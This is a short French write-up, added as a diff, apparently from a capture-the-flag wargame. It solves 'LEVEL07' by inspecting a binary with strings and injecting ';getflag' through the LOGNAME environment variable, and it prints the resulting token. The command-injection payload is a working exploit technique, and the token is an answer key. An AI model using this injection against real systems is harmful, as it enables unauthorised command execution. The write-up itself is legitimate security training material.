@@ -1,0 +1,29 @@
+-----------------------------------------------------------
+                          LEVEL07
+-----------------------------------------------------------
+
+1. On regarde les fichiers mis à notre disposition, on
+   a un executable 
+   --------------------------------------------------------
+   CMD : ls
+   OUTPUT : level07
+
+2. On get les strings à l'intérieur de cette executable 
+   --------------------------------------------------------
+   CMD : strings level07
+   OUTPUT : [...]
+            LOGNAME
+            /bin/echo %s
+            ;*2$"
+            [...]
+
+3. De fait, on sait que l'executable utilise la viriable 
+   d'environnement LOGNAME, qu'il injecte en tant que
+   1er paramètre de echo suivit de ;*2$". On export
+   ainsi la valeur ";getflag" (on y ajoute le point virgule 
+   pour concatenner avec l'éventuel continu précédemt) 
+   dans LOGNAME et on execute.
+   --------------------------------------------------------
+   CMD : export LOGNAME=';getflag' && ./level07
+   OUTPUT : Check flag.
+            Here is your token : fiumuikeil55xe9cu4dood66h
